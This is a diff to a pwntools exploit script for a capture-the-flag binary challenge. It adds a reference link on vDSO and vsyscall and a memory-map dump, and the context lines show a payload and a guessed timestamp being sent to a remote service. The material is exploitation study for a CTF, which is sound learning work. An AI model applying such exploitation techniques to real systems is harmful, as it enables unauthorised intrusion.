@@ -3,6 +3,7 @@
 #
 # Based on:
 # * http://gmiru.com/writeups/gctf-wiki/
+# * https://stackoverflow.com/questions/19938324/what-are-vdso-and-vsyscall
 #
 
 from pwn import *
@@ -73,3 +74,25 @@ r.send(payload + '\n')
 r.send(p64(int(time.time())) + '\n')  # guess remote timeval
 
 print r.recv(1024)
+
+'''
+Start              End                Perm      Name
+0x0000563558851000 0x0000563558853000 r-xp      /home/z/ctfs/wiki/challenge
+0x0000563558a52000 0x0000563558a53000 r--p      /home/z/ctfs/wiki/challenge
+0x0000563558a53000 0x0000563558a54000 rw-p      /home/z/ctfs/wiki/challenge
+0x00007f2b82b45000 0x00007f2b82d05000 r-xp      /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007f2b82d05000 0x00007f2b82f05000 ---p      /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007f2b82f05000 0x00007f2b82f09000 r--p      /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007f2b82f09000 0x00007f2b82f0b000 rw-p      /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007f2b82f0b000 0x00007f2b82f0f000 rw-p      mapped
+0x00007f2b82f0f000 0x00007f2b82f35000 r-xp      /lib/x86_64-linux-gnu/ld-2.23.so
+0x00007f2b83117000 0x00007f2b8311a000 rw-p      mapped
+0x00007f2b83132000 0x00007f2b83134000 rw-p      mapped
+0x00007f2b83134000 0x00007f2b83135000 r--p      /lib/x86_64-linux-gnu/ld-2.23.so
+0x00007f2b83135000 0x00007f2b83136000 rw-p      /lib/x86_64-linux-gnu/ld-2.23.so
+0x00007f2b83136000 0x00007f2b83137000 rw-p      mapped
+0x00007ffd4a337000 0x00007ffd4a358000 rw-p      [stack]
+0x00007ffd4a3a1000 0x00007ffd4a3a3000 r--p      [vvar]
+0x00007ffd4a3a3000 0x00007ffd4a3a5000 r-xp      [vdso]
+0xffffffffff600000 0xffffffffff601000 r-xp      [vsyscall]
+'''
